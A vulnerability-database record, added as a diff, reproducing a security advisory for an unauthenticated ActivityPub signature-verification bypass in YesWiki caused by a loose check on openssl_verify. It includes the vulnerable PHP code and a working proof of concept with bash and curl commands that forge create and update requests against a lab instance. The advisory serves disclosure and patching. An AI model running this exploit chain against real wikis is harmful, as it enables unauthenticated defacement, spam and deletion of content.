@@ -1,0 +1,232 @@
+[id]
+ave_id = "AVE-2026-0369"
+aliases = ["CVE-2026-52767","GHSA-mv28-wj57-f57g"]
+
+[basic]
+title = "YesWiki Vulnerable to Unauthenticated ActivityPub Signature-Verification Bypass via `!openssl_verify(...)` accepting `int(-1)`"
+description = "## Summary
+`HttpSignatureService::verifySignature()` checks the result of PHP's `openssl_verify()` with a **loose boolean negation** - `if (!openssl_verify(...)) { throw ... }`. PHP's `openssl_verify` has four possible return values:
+
+| return | meaning                                          | `!return` |
+| ------ | ------------------------------------------------ | --------- |
+| `1`    | signature is valid                               | `false`   |
+| `0`    | signature is invalid                             | `true` ✓  |
+| `-1`   | the verify call itself failed (internal error)   | **`false` ❌** |
+| `false`| input rejected by PHP's argument validation      | `true` ✓  |
+
+The `-1` row is the bypass: PHP's truthiness rules make `-1` a truthy value, so `!(-1) === false`, the throw is skipped, and the controller proceeds to `processActivity()`. Any condition that makes OpenSSL's `EVP_VerifyFinal()` return `-1` triggers the bypass.
+
+The two practical paths to `-1` we are aware of:
+
+1. **DSA / EC public key with an RSA-only algorithm.** `openssl_verify(..., $dsaKey, \"RSA-SHA256\")` returns `int(-1)` on PHP 8.3 + OpenSSL 3.x. This is the path the PoC uses; it works against an unmodified `php:8.3-apache` lab and against any deployment using the runtime stack YesWiki's own docker image ships.
+2. **Older PHP + older OpenSSL** where any unrecognised digest name returned `-1` rather than `false`. The reporting research mentions this path; on current stacks `false` is returned instead and the throw fires correctly. The DSA path replaces it.
+
+The reachable consequence is the same in both cases - the controller silently treats a failed verification as success and processes the attacker's payload.
+
+## Details
+### Affected component
+
+* **File:** `tools/bazar/services/HttpSignatureService.php`
+* **Method:** `HttpSignatureService::verifySignature(Request $request)`
+* **Sink:** line **130**
+
+```php
+// tools/bazar/services/HttpSignatureService.php  (v4.6.5 = origin/doryphore-dev HEAD)
+public function verifySignature(Request $request) {
+    ...                                                          // [Signature parse,
+                                                                 //  outbound key fetch — see the SSRF advisory]
+    $actorPublicKey = openssl_get_publickey($actor['publicKey']['publicKeyPem']);
+    ...
+    if (!openssl_verify(                                         // (a) LOOSE BOOLEAN CHECK
+            join(\"\n\", $sigParts),
+            base64_decode($sigConf['signature']),
+            $actorPublicKey,
+            strtoupper($sigConf['algorithm'])
+    )) {
+        throw new Exception('Signature verification failed');    // (b) skipped when openssl_verify == -1
+    }
+
+    if ($request->headers->get('Digest') !== $this->getDigest($request->getContent())) {
+        throw new Exception('Digest mismatch');                  // (c) still enforced — easy to satisfy
+    }
+}
+```
+
+The inbox controller calls `verifySignature()` and then runs `processActivity($activity, $form)`, which is what actually mutates state.
+
+### End-to-end attack chain
+
+A single unauthenticated POST per operation. No session, no CSRF, no real signature.
+
+1. **Stand up an actor document** that the attacker controls — any public web server (or webhook receiver) that returns a JSON body with the shape:
+
+    ```json
+    {
+      \"id\": \"<exact URL the server will GET>\",
+      \"publicKey\": {
+        \"id\": \"<same URL>\",
+        \"publicKeyPem\": \"<DSA public key in PEM form>\"
+      }
+    }
+    ```
+
+2. **Send a Create / Update / Delete activity** to `POST /api/forms/{enabled-form-id}/actor/inbox`:
+
+    ```http
+    POST /?api/forms/2/actor/inbox HTTP/1.1
+    Host: target.example
+    Content-Type: application/activity+json
+    Date: <RFC1123 date>
+    Digest: SHA-256=<base64(sha256(body))>
+    Signature: keyId=\"<actor URL>\",algorithm=\"RSA-SHA256\",headers=\"(request-target) host date digest content-type\",signature=\"anVuaw==\"
+
+    {\"@context\":\"https://www.w3.org/ns/activitystreams\",\"type\":\"Create\",
+     \"actor\":\"<actor URL>\",
+     \"object\":{\"id\":\"<unique object URI>\",\"type\":\"Event\",\"name\":\"...\",\"startTime\":\"...\"}}
+    ```
+
+3. **YesWiki fetches the actor document** (line 96 - the SSRF; see sibling advisory), parses it, calls `openssl_get_publickey(...)` which returns a valid OpenSSL key handle (DSA is parsed successfully), then calls `openssl_verify($data, \"junk-sig\", $dsaKey, \"RSA-SHA256\")`. EVP_VerifyFinal returns `-1`. The check `!openssl_verify(...)` evaluates to `false` and the throw is skipped.
+4. **`Digest` header is enforced**, but it's a simple `SHA-256=` of the body the attacker chose, so satisfying it costs one `sha256sum`.
+5. **`processActivity($activity, $form)` runs**: Create → `EntryManager::create()`, Update → `EntryManager::update()`, Delete → `EntryManager::delete()`. The triple store records the attacker's `object.id` as the source URL, which is how Update / Delete locate the entry on subsequent calls.
+
+## PoC
+### Pre Reqs
+
+* Yeswiki v4.6.5 lab image (Setup via podman)
+* ActivityPub enabled on the target form
+
+For the rest of this document:
+
+```bash
+BASE=\"http://localhost:8085\"
+CTR=\"yeswiki-poc\"
+KEYID=\"http://127.0.0.1:9999/actors/attacker\"
+FORM_ID=2
+MARKER=\"DEMO_$(date +%s)\"
+```
+
+PHP one-liner - runs against the exact PHP+OpenSSL the lab is using. Confirm that `openssl_verify` returns `-1`.
+
+```bash
+podman exec \"$CTR\" php -r '
+    $pem = file_get_contents(\"/tmp/attacker_keys/dsa.pub\");
+    $key = openssl_get_publickey($pem);
+    $r   = openssl_verify(\"hello\", \"junk\", $key, \"RSA-SHA256\");
+    echo \"openssl_verify returned: \" . var_export($r, true) . \"\n\";
+    echo \"!openssl_verify(...)  is: \" . var_export(!$r, true) . \"\n\";
+'
+```
+
+**Expected output:**
+
+```
+openssl_verify returned: -1
+!openssl_verify(...)  is: false
+```
+
+Verify the listener is up and serving the DSA-key actor
+
+```bash
+podman exec \"$CTR\" cat /tmp/ssrf_listener.pid
+podman exec \"$CTR\" ps -p $(podman exec \"$CTR\" cat /tmp/ssrf_listener.pid) -o stat=
+podman exec \"$CTR\" curl -s http://127.0.0.1:9999/actors/attacker | head -c 300; echo
+```
+
+**Expected output:** a PID, `S` (sleeping/alive), and a JSON document beginning with `{\"@context\":\"https://www.w3.org/ns/activitystreams\",\"id\":\"http://127.0.0.1:9999/actors/attacker\", ...` and a `publicKeyPem` field whose value starts with `-----BEGIN PUBLIC KEY-----\nMIIB...` (the DSA key - note the `Bv` prefix typical of DSA-key DER, not the `Ij` of RSA).
+
+Build a JSON Create activity that the Agenda form's reverse-semantic template can map (it expects an `Event` with `name`, `content`, `startTime`, `endTime`, `location.address.*`, etc.):
+
+```bash
+ACTIVITY='{
+  \"@context\": \"https://www.w3.org/ns/activitystreams\",
+  \"type\": \"Create\",
+  \"id\":   \"http://127.0.0.1:9999/activity/c-'\"$MARKER\"'\",
+  \"actor\":\"'\"$KEYID\"'\",
+  \"object\": {
+    \"id\":   \"http://127.0.0.1:9999/objects/'\"$MARKER\"'\",
+    \"type\": \"Event\",
+    \"name\": \"'\"$MARKER\"' — created via the signature-verification bypass\",
+    \"content\": \"openssl_verify returned -1; YesWiki accepted us anyway\",
+    \"startTime\": \"2026-12-01T10:00:00Z\",
+    \"endTime\":   \"2026-12-01T12:00:00Z\"
+  }
+}'
+
+# Digest must equal SHA-256= base64(sha256(body)) - this header IS enforced
+DIGEST=\"SHA-256=$(printf '%s' \"$ACTIVITY\" | openssl dgst -sha256 -binary | base64)\"
+DATE=\"$(date -uR | sed 's/+0000/GMT/')\"
+SIG='keyId=\"'\"$KEYID\"'\",algorithm=\"RSA-SHA256\",headers=\"(request-target) host date digest content-type\",signature=\"anVuaw==\"'
+
+curl -s -X POST \"${BASE}/?api/forms/${FORM_ID}/actor/inbox\" \
+     -H \"Content-Type: application/activity+json\" \
+     -H \"Date: ${DATE}\" \
+     -H \"Digest: ${DIGEST}\" \
+     -H \"Signature: ${SIG}\" \
+     --data-raw \"$ACTIVITY\" \
+     -w '\n  HTTP %{http_code}\n'
+```
+
+Now, try udating the entry via the same bypass
+
+The triple store records `<tag, sourceUrl, object.id>` from the Create. An Update activity referencing the same `object.id` will look that up and rewrite the entry's body.
+
+```bash
+UPDATE_ACT='{
+  \"@context\": \"https://www.w3.org/ns/activitystreams\",
+  \"type\": \"Update\",
+  \"id\":   \"http://127.0.0.1:9999/activity/u-'\"$MARKER\"'\",
+  \"actor\":\"'\"$KEYID\"'\",
+  \"object\": {
+    \"id\":   \"http://127.0.0.1:9999/objects/'\"$MARKER\"'\",
+    \"type\": \"Event\",
+    \"name\": \"'\"$MARKER\"'_UPDATED — title was changed by an unauthenticated POST\",
+    \"content\": \"this row was modified via the SAME bypass\",
+    \"startTime\": \"2026-12-01T10:00:00Z\",
+    \"endTime\":   \"2026-12-01T12:00:00Z\"
+  }
+}'
+DIGEST=\"SHA-256=$(printf '%s' \"$UPDATE_ACT\" | openssl dgst -sha256 -binary | base64)\"
+DATE=\"$(date -uR | sed 's/+0000/GMT/')\"
+
+curl -s -X POST \"${BASE}/?api/forms/${FORM_ID}/actor/inbox\" \
+     -H \"Content-Type: application/activity+json\" \
+     -H \"Date: ${DATE}\" \
+     -H \"Digest: ${DIGEST}\" \
+     -H \"Signature: ${SIG}\" \
+     --data-raw \"$UPDATE_ACT\" \
+     -w '  HTTP %{http_code}\n'
+```
+
+**Expected output:** `HTTP 200`, empty body.
+
+## Impact
+CRUD on bazar entries of any ActivityPub-enabled form, **without authentication**:
+
+* **Create** - `EntryManager::create($form['bn_id_nature'], $entry, false, $object['id'])`. New row in `yeswiki_pages` and a triple `<tag, sourceUrl, $object['id']>` in `yeswiki_triples`.
+* **Update** - looks up the entry via the source-URL triple and rewrites its body with the attacker-supplied content.
+* **Delete** - same lookup, then `EntryManager::delete($tag, true)`.
+
+Concrete operational impact:
+
+* **Defacement / content injection** at scale - a public-facing wiki with the Agenda or Blog-actu form federated becomes a publishing target for any attacker who can route TCP to the YesWiki host.
+* **Spam / SEO poisoning** through the Bazar entry body, which is HTML-rendered for the wiki and indexed by search.
+* **Erasure of legitimate federated content** - any entry previously created via ActivityPub can be enumerated through the public outbox endpoint, its `object.id` discovered, and then deleted by replaying the chain with `type=Delete`.
+* **Triple-store pollution** - the `yeswiki_triples` table grows with attacker-controlled `sourceUrl` triples that survive entry deletion and can interfere with later federation flows.
+* **Reputation / federation poisoning** - the wiki appears (to remote ActivityPub peers and to its own users) to be receiving signed content from a remote actor, when in reality anyone on the network can post."
+severity = "HIGH"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-23T18:00:10.580950218+00:00"
